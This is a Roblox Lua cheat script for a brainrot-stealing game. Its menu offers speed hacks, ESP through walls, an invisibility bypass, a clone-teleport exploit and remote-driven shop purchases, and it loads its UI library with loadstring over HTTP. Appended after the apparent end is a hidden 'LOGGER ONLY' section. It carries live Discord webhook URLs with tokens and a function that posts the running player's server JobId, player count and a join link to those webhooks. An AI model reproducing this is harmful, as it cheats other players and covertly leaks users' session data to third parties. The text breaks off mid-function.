-- Starfall Lua Script with Orion UI Integration
-- This script integrates the speed grapple hook functionality into the Orion UI

-- Check if the current game is one of the allowed games
local allowedGames = {
    [96342491571673] = true,
    [109983668079237] = true
}

if not allowedGames[game.PlaceId] then
    return -- Exit if not in allowed games
end

-- Load the Orion Library
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/jensonhirst/Orion/main/source')))()

-- Create the main window
local Window = OrionLib:MakeWindow({
    Name = "Starfall - Speed Grapple Hook",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "Starfall"
})

-- Create the Player tab
local PlayerTab = Window:MakeTab({
    Name = "Player",
    Icon = "rbxassetid://4483457234",
    PremiumOnly = false
})

-- Create the Misc tab
local MiscTab = Window:MakeTab({
    Name = "Misc",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Create the Teleport tab
local TeleportTab = Window:MakeTab({
    Name = "Teleport",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Create the Shop tab
local ShopTab = Window:MakeTab({
    Name = "Shop",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Create the Visuals tab
local VisualsTab = Window:MakeTab({
    Name = "Visuals",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Create the Invisible tab
local InvisibleTab = Window:MakeTab({
    Name = "Invisible",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})


PlayerTab:AddLabel("Grapple Hook is needed for it to work")

-- ===== Speed Grapple Hook Integration =====
local player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

-- ===== Vars =====
local speedGrappleEnabled = false
local currentSpeed = 150
local DEFAULT_SPEED = 16
local character, humanoid, hrp
local speedConnection
local fakeFireLoop
local itemID = "Grapple Hook"
local useItemRE = ReplicatedStorage:WaitForChild("Packages")
    :WaitForChild("Net")
    :WaitForChild("RE/UseItem")

-- ===== Visual Vars =====
local playerVisuals = {}
local baseLockVisuals = {}
local playerESPEnabled = false
local baseLockESPEnabled = false

-- ===== Invisible Bypass Vars =====
local Players = game:GetService("Players")
local Debris = game:GetService("Debris")
local CoreGui = game:GetService("CoreGui")
local lp = Players.LocalPlayer

local MIN_HOLD_TIME = 1.00
local BypassEnabled = false
local ProxyEnabled = false
local connectedPrompts = {}

-- ===== Functions =====
local function updateCharacter()
    character = player.Character or player.CharacterAdded:Wait()
    humanoid = character and character:WaitForChild("Humanoid", 5)
    hrp = character and character:WaitForChild("HumanoidRootPart", 5)
    if humanoid then
        humanoid.JumpPower = 50
    end
end

-- SpeedHack
local function startSpeedHack()
    if speedConnection then speedConnection:Disconnect() speedConnection=nil end
    if not speedGrappleEnabled or not humanoid or not hrp then return end
    speedConnection = RunService.Heartbeat:Connect(function()
        if not speedGrappleEnabled or not humanoid or not hrp then return end
        local dir = humanoid.MoveDirection.Magnitude > 0 and humanoid.MoveDirection.Unit or Vector3.new(0,0,0)
        hrp.AssemblyLinearVelocity = Vector3.new(dir.X*currentSpeed, hrp.AssemblyLinearVelocity.Y, dir.Z*currentSpeed)
    end)
end

-- Grapple Hook
local function buyGrapple()
    pcall(function()
        ReplicatedStorage:WaitForChild("Packages")
            :WaitForChild("Net")
            :WaitForChild("RF/CoinsShopService/RequestBuy")
            :InvokeServer(itemID)
    end)
end

local function autoEquip()
    pcall(function()
        local character = player.Character
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        if not (character and humanoid and humanoid.Health>0) then return end
        local currentTool = character:FindFirstChildOfClass("Tool")
        if currentTool and currentTool.Name==itemID then return end
        local backpack = player:WaitForChild("Backpack")
        local grappleInBackpack = backpack:FindFirstChild(itemID)
        if grappleInBackpack then humanoid:EquipTool(grappleInBackpack) end
    end)
end

local function fakeFire()
    autoEquip()
    local args = {1.9832406361897787}
    pcall(function()
        useItemRE:FireServer(unpack(args))
    end)
end

local function startFakeFireLoop()
    if fakeFireLoop then fakeFireLoop:Disconnect() end
    fakeFireLoop = RunService.Heartbeat:Connect(function()
        if speedGrappleEnabled then fakeFire() end
    end)
end

local function stopAll()
    if speedConnection then speedConnection:Disconnect() speedConnection=nil end
    if humanoid then humanoid.WalkSpeed = DEFAULT_SPEED end
    if fakeFireLoop then fakeFireLoop:Disconnect() fakeFireLoop=nil end
end

-- Toggle function for the UI
local function toggleSpeedGrapple(value)
    speedGrappleEnabled = value
    updateCharacter()
    if speedGrappleEnabled then
        startSpeedHack()
        buyGrapple()
        startFakeFireLoop()
    else
        stopAll()
    end
end

-- ===== Visual Functions =====
local function removePlayerVisuals(targetPlayer)
    local visuals = playerVisuals[targetPlayer]
    if not visuals then return end
    visuals.Disable()
end

local function createPlayerVisuals(targetPlayer)
    if playerVisuals[targetPlayer] or targetPlayer == player then
        return
    end

    local character = targetPlayer.Character
    if not character then return end
    
    local root = character:FindFirstChild("HumanoidRootPart")
    if not root then return end

    local box = Instance.new("BoxHandleAdornment", root)
    box.Color3 = Color3.fromRGB(0, 255, 0)
    box.Size = Vector3.new(4, 6, 1)
    box.Transparency = 0.5
    box.AlwaysOnTop = true
    box.Adornee = root

    local billboard = Instance.new("BillboardGui", root)
    billboard.StudsOffset = Vector3.new(0, 4, 0)
    billboard.Size = UDim2.new(0, 100, 0, 50)
    billboard.AlwaysOnTop = true
    billboard.Adornee = root

    local textLabel = Instance.new("TextLabel", billboard)
    textLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
    textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextStrokeTransparency = 0
    textLabel.Text = targetPlayer.Name
    textLabel.TextScaled = true

    local connection = targetPlayer.CharacterAdded:Connect(function(newCharacter)
        newCharacter:WaitForChild("HumanoidRootPart")
        removePlayerVisuals(targetPlayer)
        createPlayerVisuals(targetPlayer)
    end)

    playerVisuals[targetPlayer] = {
        Box = box,
        Billboard = billboard,
        Connection = connection,
        Disable = function()
            if box then box:Destroy() end
            if billboard then billboard:Destroy() end
            if connection then connection:Disconnect() end
            playerVisuals[targetPlayer] = nil
        end
    }
end

-- Base Lock ESP Functions
local function getLockCooldown(base)
    if not base or not base:FindFirstChild("Purchases") then
        return 0
    end
    
    local plotBlock = base.Purchases:FindFirstChild("PlotBlock")
    if not plotBlock or not plotBlock:FindFirstChild("Main") then
        return 0
    end
    
    local billboardGui = plotBlock.Main:FindFirstChild("BillboardGui")
    if not billboardGui or not billboardGui:FindFirstChild("RemainingTime") then
        return 0
    end
    
    local cooldownText = billboardGui.RemainingTime.Text:gsub("s", ""):gsub(" ", "")
    return tonumber(cooldownText) or 0
end

local function createBaseLockVisuals(base)
    if baseLockVisuals[base] or not base:FindFirstChild("Purchases") then
        return
    end
    
    local plotBlock = base.Purchases:FindFirstChild("PlotBlock")
    if not plotBlock or not plotBlock:FindFirstChild("Hitbox") then
        return
    end
    
    local hitbox = plotBlock.Hitbox
    
    -- Create box around the base
    local box = Instance.new("BoxHandleAdornment")
    box.Color3 = Color3.fromRGB(255, 255, 0) -- Yellow color for base lock
    box.Size = Vector3.new(8, 8, 8)
    box.Transparency = 0.7
    box.AlwaysOnTop = true
    box.Adornee = hitbox
    box.Parent = hitbox
    
    -- Create billboard for lock time
    local billboard = Instance.new("BillboardGui")
    billboard.StudsOffset = Vector3.new(0, 6, 0)
    billboard.Size = UDim2.new(0, 120, 0, 50)
    billboard.AlwaysOnTop = true
    billboard.Adornee = hitbox
    billboard.Parent = hitbox
    
    local textLabel = Instance.new("TextLabel")
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
    textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextStrokeTransparency = 0
    textLabel.TextScaled = true
    textLabel.Parent = billboard
    
    -- Update function for lock time
    local function updateLockTime()
        local lockTime = getLockCooldown(base)
        if lockTime > 0 then
            textLabel.Text = "Lock: " .. lockTime .. "s"
            textLabel.TextColor3 = Color3.fromRGB(255, 100, 100) -- Red when locked
        else
            textLabel.Text = "Unlocked"
            textLabel.TextColor3 = Color3.fromRGB(100, 255, 100) -- Green when unlocked
        end
    end
    
    -- Initial update
    updateLockTime()
    
    -- Create connection to update lock time every second
    local connection = game:GetService("RunService").Heartbeat:Connect(function()
        updateLockTime()
    end)
    
    baseLockVisuals[base] = {
        box = box,
        billboard = billboard,
        textLabel = textLabel,
        connection = connection
    }
end

local function removeBaseLockVisuals(base)
    if baseLockVisuals[base] then
        -- Remove visual elements
        if baseLockVisuals[base].box then
            baseLockVisuals[base].box:Destroy()
        end
        if baseLockVisuals[base].billboard then
            baseLockVisuals[base].billboard:Destroy()
        end
        if baseLockVisuals[base].connection then
            baseLockVisuals[base].connection:Disconnect()
        end
        
        -- Clear from table
        baseLockVisuals[base] = nil
    end
end

-- ===== Invisible Bypass Functions =====
local function SafeDestroy(t)
    if t then Debris:AddItem(t, 0) end
end

local function SafeReplicateSignal(sig, ...)
    if sig and replicatesignal then
        replicatesignal(sig, ...)
    end
end

local function GetBodyClass(name)
    if lp.Character and lp.Character:FindFirstChildWhichIsA(name, true) then
        return lp.Character:FindFirstChildWhichIsA(name, true)
    end
    return nil
end

local function GetBodyChild(name)
    if lp.Character and lp.Character:FindFirstChild(name, true) then
        return lp.Character:FindFirstChild(name, true)
    end
    return nil
end

local function BrokeJoints()
    return GetBodyChild("Neck") == nil
end

local function ResetCharacter()
    if lp.Character and lp.Character:FindFirstChild("Humanoid") then
        pcall(function() lp.Character.Humanoid.Health = 0 end)
    end
    BypassEnabled = false
end

local function InvisibleBypass(force)
    if not force and not BypassEnabled then return end
    if BrokeJoints() then return end
    local humanoid = GetBodyClass("Humanoid")
    if lp.Character and humanoid then
        SafeReplicateSignal(humanoid.ServerBreakJoints)
        for _, v in pairs(lp.Character:GetChildren()) do
            if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
                SafeDestroy(v)
            end
        end
        task.wait(0.1)
        if force then
            BypassEnabled = true
        end
    end
end

local function connectPrompt(prompt)
    if not prompt or not prompt:IsA("ProximityPrompt") then return end
    if prompt.ActionText ~= "Steal" then return end
    if connectedPrompts[prompt] then return end
    connectedPrompts[prompt] = true
    prompt.Triggered:Connect(function()
        if not ProxyEnabled then return end
        task.wait(MIN_HOLD_TIME)
        if prompt:IsDescendantOf(workspace) and ProxyEnabled then
            InvisibleBypass(true)
        end
    end)
end

-- ===== UI Elements =====
-- Add the speed grapple hook toggle to the Player tab
PlayerTab:AddToggle({
    Name = "Speed Grapple Hook",
    Default = false,
    Callback = function(Value)
        toggleSpeedGrapple(Value)
    end
})

-- Add a slider to control the speed
PlayerTab:AddSlider({
    Name = "Speed Value",
    Min = 40,
    Max = 150,
    Default = 150,
    Color = Color3.fromRGB(9, 149, 98),
    Increment = 1,
    ValueName = "Speed",
    Callback = function(Value)
        currentSpeed = Value
    end
})

-- ===== Teleport Tab Elements =====
TeleportTab:AddLabel("Quantum cloner needed")

-- TP to best brainrot function
local function equipQuantumCloner()
    local player = game.Players.LocalPlayer
    local backpack = player:FindFirstChild("Backpack")
    local character = player.Character
    
    if backpack and character then
        for _, item in pairs(backpack:GetChildren()) do
            if item.Name == "Quantum Cloner" then
                item.Parent = character
                return
            end
        end
    end
end

local function teleportToBestPet()
    local function extractNumber(str)
        if not str then return 0 end
        local numberStr = str:match("%$(.-)/s")
        if not numberStr then return 0 end
        numberStr = numberStr:gsub("%s", "")
        local multiplier = 1
        if numberStr:lower():find("k") then
            multiplier = 1000
            numberStr = numberStr:gsub("[kK]", "")
        elseif numberStr:lower():find("m") then
            multiplier = 1000000
            numberStr = numberStr:gsub("[mM]", "")
        elseif numberStr:lower():find("b") then
            multiplier = 1000000000
            numberStr = numberStr:gsub("[bB]", "")
        end
        return (tonumber(numberStr) or 0) * multiplier
    end

    local function getAllPodiums()
        local podiums = {}
        if workspace:FindFirstChild("Plots") then
            for _, plot in pairs(workspace.Plots:GetChildren()) do
                local animalPods = plot:FindFirstChild("AnimalPodiums")
                if animalPods then
                    for _, pod in pairs(animalPods:GetChildren()) do
                        local base = pod:FindFirstChild("Base")
                        if base and base:FindFirstChild("Spawn") then
                            local attach = base.Spawn:FindFirstChild("Attachment")
                            if attach and attach:FindFirstChild("AnimalOverhead") then
                                table.insert(podiums, attach.AnimalOverhead)
                            end
                        end
                    end
                end
            end
        end
        return podiums
    end

    local bestValue = -math.huge
    local bestPosition = nil

    for _, overhead in pairs(getAllPodiums()) do
        local base = overhead.Parent.Parent.Parent
        if base and (base:IsA("BasePart") or base:IsA("Model")) then
            local genLabel = overhead:FindFirstChild("Generation")
            if genLabel then
                local genValue = extractNumber(genLabel.Text)
                if genValue > bestValue then
                    bestValue = genValue
                    if base:IsA("BasePart") then
                        bestPosition = base.Position
                    elseif base:IsA("Model") and base:FindFirstChild("HumanoidRootPart") then
                        bestPosition = base.HumanoidRootPart.Position
                    elseif base:FindFirstChild("Base") then
                        bestPosition = base.Base.Position
                    else
                        bestPosition = base:GetModelCFrame().Position
                    end
                end
            end
        end
    end

    if bestPosition then
        local character = game.Players.LocalPlayer.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            character.HumanoidRootPart.CFrame = CFrame.new(bestPosition + Vector3.new(0, 5, 0))
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.Health = 0
            end
        end
    end
end

local function executeBrainrotSequence()
    teleportToBestPet()
    
    task.wait(2)
    
    equipQuantumCloner()
    
    local REUseItem = ReplicatedStorage.Packages.Net["RE/UseItem"] 
    local REQuantumClonerOnTeleport = ReplicatedStorage.Packages.Net["RE/QuantumCloner/OnTeleport"]
    
    REUseItem:FireServer()
    task.wait(2)
    REQuantumClonerOnTeleport:FireServer()
    
    task.wait(4)
    
    local player = game.Players.LocalPlayer
    if not player.Character or player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health <= 0 then
        player.CharacterAdded:Wait()
    end
    task.wait(1)
    equipQuantumCloner()
    
    for i = 1, 10 do
        REUseItem:FireServer()
        REQuantumClonerOnTeleport:FireServer()
        task.wait(0.01)
    end
end

-- Add warning label
TeleportTab:AddParagraph("Warning", "You will get reseted, but ur clone will be inside the base so tp to the clone")

-- Add the TP to best brainrot toggle
TeleportTab:AddButton({
    Name = "TP to best brainrot",
    Callback = function()
        executeBrainrotSequence()
    end
})


-- ===== Misc Tab Elements =====
-- Anti-Steal Protection
local antiStealZone = nil
local ProtectionEnabled = false
local ProtectionThread = false
local ignoreFriends = false

local function getPlayerBaseHome()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end
    
    local localPlayer = player
    local userLower = string.lower(localPlayer.Name)
    local displayLower = string.lower(localPlayer.DisplayName)
    
    for _, base in ipairs(plots:GetChildren()) do
        if base:IsA("Model") then
            local match = false
            for _, d in ipairs(base:GetDescendants()) do
                if d:IsA("TextLabel") then
                    local txt = string.lower(d.Text)
                    if string.find(txt, userLower, 1, true) or string.find(txt, displayLower, 1, true) then
                        match = true
                        break
                    end
                end
            end
            if match then
                local decorations = base:FindFirstChild("Decorations")
                if decorations then
                    local innerModel = decorations:FindFirstChild("Model")
                    if innerModel then
                        local kids = innerModel:GetChildren()
                        if #kids >= 5 and kids[5]:IsA("BasePart") then
                            return kids[5]
                        end
                        for _, c in ipairs(kids) do
                            if c:IsA("BasePart") then
                                return c
                            end
                        end
                    end
                end
            end
        end
    end
    return nil
end

local function isInsidePart(part, pos)
    local localPos = part.CFrame:PointToObjectSpace(pos)
    local half = part.Size / 2
    return math.abs(localPos.X) <= half.X
        and math.abs(localPos.Y) <= half.Y
        and math.abs(localPos.Z) <= half.Z
end

local function activateAntiSteal()
    if ProtectionEnabled then return end
    ProtectionEnabled = true
    ProtectionThread = true

    local basePart = getPlayerBaseHome()
    if basePart then
        antiStealZone = Instance.new("Part")
        antiStealZone.Name = "AntiStealZone"
        antiStealZone.Anchored = true
        antiStealZone.CanCollide = false
        antiStealZone.Transparency = 0.5
        antiStealZone.BrickColor = BrickColor.new("Really red")
        antiStealZone.Size = Vector3.new(37, 42, 300)
        antiStealZone.CFrame = basePart.CFrame
        antiStealZone.Parent = workspace

        task.spawn(function()
            while ProtectionEnabled and ProtectionThread do
                for _, plr in pairs(game.Players:GetPlayers()) do
                    if plr ~= player and plr.Character then
                        -- Skip friends if ignoreFriends is enabled
                        if not (ignoreFriends and plr:IsFriendsWith(player.UserId)) then
                            local humanoidRootPart = plr.Character:FindFirstChild("HumanoidRootPart")
                            if humanoidRootPart and isInsidePart(antiStealZone, humanoidRootPart.Position) then
                                ProtectionThread = false
                                task.wait(1)
                                player:Kick("Anti Steal Protection: Someone entered your base area!")
                                break
                            end
                        end
                    end
                end
                task.wait(0.1)
            end
        end)
    end
end

local function deactivateAntiSteal()
    ProtectionEnabled = false
    ProtectionThread = false
    if antiStealZone and antiStealZone.Parent then
        antiStealZone:Destroy()
        antiStealZone = nil
    end
end

-- Anti-Steal Protection UI

MiscTab:AddLabel("Protect your base from other players")

MiscTab:AddToggle({
    Name = "Anti Steal",
    Default = false,
    Callback = function(Value)
        if Value then
            activateAntiSteal()
        else
            deactivateAntiSteal()
        end
    end
})

MiscTab:AddToggle({
    Name = "Ignore Friends",
    Default = false,
    Callback = function(Value)
        ignoreFriends = Value
    end
})

-- Anti Hit Feature
local antiHitEnabled = false
local originalTransparency = 0

local function toggleAntiHit(value)
    antiHitEnabled = value
    local character = player.Character
    if character then
        local parts = character:GetDescendants()
        for _, part in pairs(parts) do
            if part:IsA("BasePart") then
                if antiHitEnabled then
                    originalTransparency = part.Transparency
                    part.Transparency = 0.5 -- Make player semi-transparent
                else
                    part.Transparency = originalTransparency -- Restore original transparency
                end
            end
        end
    end
end

MiscTab:AddLabel("Anti Hit Feature")

MiscTab:AddToggle({
    Name = "Anti Hit",
    Default = false,
    Callback = function(Value)
        toggleAntiHit(Value)
    end
})

-- ===== Shop Tab Elements =====
ShopTab:AddLabel("Item Shop")
ShopTab:AddLabel("Purchase various items for your gameplay")

local shopItems = {
    "Slap", "Speed Coil", "Trap", "Iron Slap", "Gravity Coil", "Bee Launcher", "Gold Slap",
    "Coil Combo", "Rage Table", "Diamond Slap", "Grapple Hook", "Taser Gun", "Emerald Slap",
    "Invisibility Cloak", "Boogie Bomb", "Ruby Slap", "Medusa's Head", "Dark Matter Slap",
    "Web Slinger", "Flame Slap", "Quantum Cloner", "All Seeing Sentry", "Nuclear Slap",
    "Rainbowrath Sword", "Body Swap Potion", "Splatter Slap", "Paintball Gun"
}

local selectedShopItem = "Slap"

-- Shop dropdown for item selection
ShopTab:AddDropdown({
    Name = "Select Item",
    Default = selectedShopItem,
    Options = shopItems,
    Callback = function(Value)
        selectedShopItem = Value
    end
})

-- Buy selected item button
ShopTab:AddButton({
    Name = "Buy Selected Item",
    Callback = function()
        pcall(function()
            ReplicatedStorage:WaitForChild("Packages")
                :WaitForChild("Net")
                :WaitForChild("RF/CoinsShopService/RequestBuy")
                :InvokeServer(selectedShopItem)
        end)
        
        OrionLib:MakeNotification({
            Name = "Shop",
            Content = "Attempting to buy " .. selectedShopItem,
            Time = 2
        })
    end
})

ShopTab:AddLabel("Quick Buy Items")
ShopTab:AddLabel("One-click purchase for common items")

local quickBuyItems = {
    "Speed Coil",
    "Invisibility Cloak", 
    "Rainbowrath Sword",
    "Web Slinger"
}

for _, itemName in ipairs(quickBuyItems) do
    ShopTab:AddButton({
        Name = "Buy " .. itemName,
        Callback = function()
            pcall(function()
                ReplicatedStorage:WaitForChild("Packages")
                    :WaitForChild("Net")
                    :WaitForChild("RF/CoinsShopService/RequestBuy")
                    :InvokeServer(itemName)
            end)
            
            OrionLib:MakeNotification({
                Name = "Shop",
                Content = "Attempting to buy " .. itemName,
                Time = 2
            })
        end
    })
end

-- ===== Visuals Tab Elements =====
VisualsTab:AddLabel("Player Visualization")
VisualsTab:AddLabel("See other players through walls")

-- Player ESP Toggle
VisualsTab:AddToggle({
    Name = "Player ESP",
    Default = false,
    Callback = function(Value)
        playerESPEnabled = Value
        
        if playerESPEnabled then
            -- Create visuals for all current players
            for _, targetPlayer in pairs(game.Players:GetPlayers()) do
                if targetPlayer ~= player then
                    createPlayerVisuals(targetPlayer)
                end
            end
            
            -- Handle new players joining
            game.Players.PlayerAdded:Connect(function(newPlayer)
                if playerESPEnabled and newPlayer ~= player then
                    repeat task.wait() until newPlayer.Character and newPlayer.Character:FindFirstChild("HumanoidRootPart")
                    createPlayerVisuals(newPlayer)
                end
            end)
        else
            -- Remove all player visuals
            for targetPlayer, _ in pairs(playerVisuals) do
                removePlayerVisuals(targetPlayer)
            end
        end
    end
})

-- Base Lock ESP Toggle
VisualsTab:AddToggle({
    Name = "Base Lock ESP",
    Default = false,
    Callback = function(Value)
        baseLockESPEnabled = Value
        
        if Value then
            -- Enable Base Lock ESP for all existing bases
            for _, plot in pairs(workspace.Plots:GetChildren()) do
                if plot:FindFirstChild("Purchases") then
                    createBaseLockVisuals(plot)
                end
            end
        else
            -- Disable Base Lock ESP for all bases
            for plot, _ in pairs(baseLockVisuals) do
                removeBaseLockVisuals(plot)
            end
        end
        
        OrionLib:MakeNotification({
            Name = "Base Lock ESP",
            Content = Value and "Base Lock ESP Enabled" or "Base Lock ESP Disabled",
            Time = 2
        })
    end
})


-- ===== Invisible Tab Elements =====
InvisibleTab:AddToggle({
    Name = "Toggle Invisible",
    Default = false,
    Callback = function(Value)
        BypassEnabled = Value
        if BypassEnabled then
            InvisibleBypass(false)
        else
            ResetCharacter()
        end
    end
})

InvisibleTab:AddToggle({
    Name = "Toggle Proxy",
    Default = false,
    Callback = function(Value)
        ProxyEnabled = Value
    end
})

-- Connect proximity prompts for invisible bypass
workspace.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("ProximityPrompt") then
        connectPrompt(descendant)
    end
end)

-- Connect existing proximity prompts
for _, descendant in pairs(workspace:GetDescendants()) do
    if descendant:IsA("ProximityPrompt") then
        connectPrompt(descendant)
    end
end

OrionLib:Init()

-- ===== Player Connections for Visuals =====
game.Players.PlayerAdded:Connect(function(newPlayer)
    if playerESPEnabled and newPlayer ~= player then
        repeat task.wait() until newPlayer.Character and newPlayer.Character:FindFirstChild("HumanoidRootPart")
        createPlayerVisuals(newPlayer)
    end
end)

game.Players.PlayerRemoving:Connect(function(leavingPlayer)
    removePlayerVisuals(leavingPlayer)
end)

-- Base Connections for Visuals
workspace.Plots.ChildAdded:Connect(function(newPlot)
    if baseLockESPEnabled and newPlot:FindFirstChild("Purchases") then
        createBaseLockVisuals(newPlot)
    end
end)

workspace.Plots.ChildRemoved:Connect(function(removedPlot)
    removeBaseLockVisuals(removedPlot)
end)

player.CharacterAdded:Connect(function()
    task.wait(0.5)
    updateCharacter()
    if speedGrappleEnabled then
        startSpeedHack()
    end
end)

-- Character connection for invisible bypass
lp.CharacterAdded:Connect(function()
    task.wait(0.5)
    -- Reset bypass status when character respawns
    BypassEnabled = false
end)

-- End of script

-- ================= LOGGER ONLY =============== -- 
 -- ================= LOGGER ONLY =============== -- 
  local Rarities = {"Brainrot God", "Secret", "Common"}
    local svc = setmetatable({}, {
        __index = function(t, k)
            local s = game:GetService(k)
            t[k] = s
            return s
        end
    })

    local cfg = {
        mutenabled = true,
        baseenabled = true,
        webhook = "https://discord.com/api/webhooks/1403440116357398528/hmLuR2XSMTJIAUZDcfxJ8dwRXndTPv3saXR0DR872spWL_GmYX1EzILY9-y2uE2uzMYf",
        brainrots = {
            -- Brainrot God
            "Cocofanto Elefanto", "Tralalero Tralala", "Odin Din Din Dun", "Girafa Celestre", 
            "Trenostruzzo Turbo 3000", "Matteo", "Tigroligre Frutonni", "Orcalero Orcala", 
            "Statutino Libertino", "Gattatino Neonino", "Espresso Signora", "Ballerino Lololo", 
            "Piccione Macchina", "Los Crocodillitos", "Tukanno Bananno", "Trippi Troppi Troppa Trippa", 
            "Los Tungtungtungcitos", "Agarrini la Palini", "Bulbito Bandito Traktorito", "Los Orcalitos",
            -- Secret
            "La Vacca Saturno Saturnita", "Los Tralaleritos", "Graipuss Medussi", "La Grande Combinasion", 
            "Chimpanzini Spiderini", "Garama and Madundung", "Torrtuginni Dragonfrutini", "Las Tralaleritas", 
            "Pot Hotspot", "Nuclearo Dinossauro", "Las Vaquitas Saturnitas", "Chicleteira Bicicleteira", 
            "Los Combinasionas", "Karkerkar Kurkur", "Dragon Cannelloni", "Los Hotspotsitos", "Esok Sekolah"
        },
        mutations = {"Gold", "Diamond", "Rainbow", "Candy","Lava"},
        allowedRarities = {"Common", "Brainrot God", "Secret"},
        selected = {brainrots = {}, mutations = {}},
        found = {},
        cons = {}
    }

    local GenerationData = {
        ["Noobini Pizzanini"] = 1,
        ["Lirilì Larilà"] = 3,
        ["Tim Cheese"] = 5,
        ["Fluriflura"] = 7,
        ["Svinina Bombardino"] = 10,
        ["Talpa Di Fero"] = 9,
        ["Pipi Kiwi"] = 13,
        ["Pipi Corni"] = 14,
        ["Cocofanto Elefanto"] = 10000,
        ["Tralalero Tralala"] = 50000,
        ["Odin Din Din Dun"] = 75000,
        ["Girafa Celestre"] = 20000,
        ["Trenostruzzo Turbo 3000"] = 150000,
        ["Matteo"] = 50000,
        ["Tigroligre Frutonni"] = 60000,
        ["Orcalero Orcala"] = 100000,
        ["Statutino Libertino"] = 75000,
        ["Gattatino Neonino"] = 35000,
        ["Espresso Signora"] = 70000,
        ["Ballerino Lololo"] = 200000,
        ["Piccione Macchina"] = 225000,
        ["Los Crocodillitos"] = 55000,
        ["Tukanno Bananno"] = 100000,
        ["Trippi Troppi Troppa Trippa"] = 175000,
        ["Los Tungtungtungcitos"] = 210000,
        ["Agarrini la Palini"] = 425000,
        ["La Vacca Saturno Saturnita"] = 250000,
        ["Los Tralaleritos"] = 500000,
        ["Graipuss Medussi"] = 1000000,
        ["La Grande Combinasion"] = 10000000,
        ["Chimpanzini Spiderini"] = 325000,
        ["Garama and Madundung"] = 50000000,
        ["Torrtuginni Dragonfrutini"] = 350000,
        ["Las Tralaleritas"] = 650000,
        ["Pot Hotspot"] = 2500000,
        ["Nuclearo Dinossauro"] = 15000000,
        ["Las Vaquitas Saturnitas"] = 750000,
        ["Chicleteira Bicicleteira"] = 3500000,
        ["Los Combinasionas"] = 15000000,
        ["Karkerkar Kurkur"] = 275000,
        ["Dragon Cannelloni"] = 100000000,
        ["Los Hotspotsitos"] = 20000000,
        ["Esok Sekolah"] = 30000000
    }

    -- //  Mutation multipliers
    local MutationMultipliers = {
        ["Gold"] = 1.25,
        ["Diamond"] = 1.50,
        ["Rainbow"] = 10,
        ["Candy"] = 4,
        ["Lava"]  = 6,
        ["Bloodrot"]  = 2,
        ["Celestial"] = 4,
        ["Rain"] = 2.5,
        ["Snow"] = 3,
        ["Starfall"] = 3.5,
        ["Bubblegum"] = 3,
        ["Firework"] =  6,
        ["Crab"] =  4,
        ["Glitch"] =  5,
        ["Nyan cat"] =  6,
        ["Taco"] =  4, 
        ["Concert"]  = 5,
        ["10B"] = 4
    }

    local function formatNumber(num)
        if num >= 1000000 then
            return string.format("%.1fm", num / 1000000)
        elseif num >= 1000 then
            return string.format("%.1fk", num / 1000)
        else
            return tostring(num)
        end
    end

    local function getGenerationPerSecond(brainrotName, mutation)
        local generation = GenerationData[brainrotName]
        if generation then
            local finalGeneration = generation
            if mutation and mutation ~= "" then
                local totalMultiplier = 1
                local mutations = {}
                for mut in string.gmatch(mutation, "[^%s,+]+") do
                    table.insert(mutations, mut)
                end
                for _, mut in pairs(mutations) do
                    if MutationMultipliers[mut] then
                        totalMultiplier = totalMultiplier * MutationMultipliers[mut]
                    end
                end
                finalGeneration = generation * totalMultiplier
            end
            return formatNumber(finalGeneration) .. "/s"
        end
        return "Unknown"
    end

    local function getRawGenerationValue(brainrotName, mutation)
        local generation = GenerationData[brainrotName]
        if generation then
            local finalTechnology = generation
            if mutation and mutation ~= "" then
                local totalMultiplier = 1
                local mutations = {}
                for mut in string.gmatch(mutation, "[^%s,+]+") do
                    table.insert(mutations, mut)
                end
                for _, mut in pairs(mutations) do
                    if MutationMultipliers[mut] then
                        totalMultiplier = totalMultiplier * MutationMultipliers[mut]
                    end
                end
                finalGeneration = generation * totalMultiplier
            end
            return finalGeneration
        end
        return 0
    end

    -- Neue Webhook-Funktion für 5-Millionen-Bereich
    local function send5MillionHook(title, desc)
        if workspace.Map.Codes.Main.SurfaceGui.MainFrame.PrivateServerMessage.Visible then
            return
        end
        local webhook5Million = "https://discord.com/api/webhooks/1416823084421218506/jXJfxqZfCVcX7hZREMX5xmNgIhqDxfDxVyyhX44QYrkNQ_ZdUGMn6lHzM0qAXMHUJ8Cj"
        spawn(function()
            local joinUrl = "https://kebabman.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
            request({
                Url = webhook5Million,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = svc.HttpService:JSONEncode({
                    embeds = {{
                        title = title,
                        description = desc,
                        color = 0x00ff00,
                        fields = {
                            {
                                name = "🔗 Join with URL",
                                value = "[Join here](" .. joinUrl .. ")",
                                inline = false
                            },
                            {
                                name = "🆔 Job ID",
                                value = "`" .. game.JobId .. "`",
                                inline = false
                            },
                            {
                                name = "👥 Server Info",
                                value = #svc.Players:GetPlayers() .. "/" .. svc.Players.MaxPlayers .. " players",
                                inline = false
                            }
                        },
                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                        footer = {
                            text = "Made by Habibi ❤️"
